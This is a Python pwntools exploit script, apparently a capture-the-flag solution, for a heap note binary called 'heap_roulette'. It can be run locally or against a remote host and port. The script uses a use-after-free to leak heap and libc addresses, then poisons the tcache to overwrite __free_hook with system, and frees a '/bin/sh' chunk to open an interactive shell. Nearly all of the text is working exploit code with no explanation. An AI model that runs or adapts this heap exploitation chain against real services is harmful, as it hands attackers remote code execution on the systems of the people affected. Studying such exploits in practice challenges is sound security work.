#!/usr/bin/env python3

from pwn import *

BINARY = './heap_roulette'
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

elf = ELF(BINARY)
libc = ELF(LIBC)

def conn():
    if args.REMOTE:
        return remote(args.HOST, args.PORT)
    else:
        return process(BINARY)

def create(p, size, content):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    p.recvuntil(b'Created note ')

def edit(p, idx, content):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'New content: ')
    p.send(content)
    p.recvuntil(b'Updated!')

def delete(p, idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Deleted!')

def view(p, idx):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: ')
    content = p.recvline().strip()
    return content

def exploit():
    p = conn()
    
    create(p, 0x20, b'A' * 0x20)
    create(p, 0x20, b'B' * 0x20)
    create(p, 0x20, b'C' * 0x20)
    
    delete(p, 0)
    delete(p, 1)
    delete(p, 2)
    
    heap_leak = view(p, 0)
    heap_addr = u64(heap_leak.ljust(8, b'\x00'))
    log.info(f"Heap leak: {hex(heap_addr)}")
    
    create(p, 0x400, b'X' * 0x400)
    create(p, 0x20, b'Y' * 0x20)
    
    delete(p, 3)
    
    libc_leak = view(p, 3)
    libc_addr = u64(libc_leak.ljust(8, b'\x00'))
    libc_base = libc_addr - 0x1ebb61
    
    log.info(f"Libc leak: {hex(libc_addr)}")
    log.info(f"Libc base: {hex(libc_base)}")
    
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']
    
    log.info(f"__free_hook: {hex(free_hook)}")
    log.info(f"system: {hex(system_addr)}")
    
    create(p, 0x20, b'A' * 0x20)
    create(p, 0x20, b'B' * 0x20)
    
    delete(p, 5)
    delete(p, 6)
    
    log.info("Tcache poisoning...")
    edit(p, 6, p64(free_hook))
    
    create(p, 0x20, b'Z' * 0x20)
    
    create(p, 0x20, p64(system_addr))
    
    log.info("Triggering shell...")
    create(p, 0x20, b'/bin/sh\x00')
    delete(p, 9)
    
    log.success("Got shell!")
    p.interactive()

if __name__ == '__main__':
    exploit()
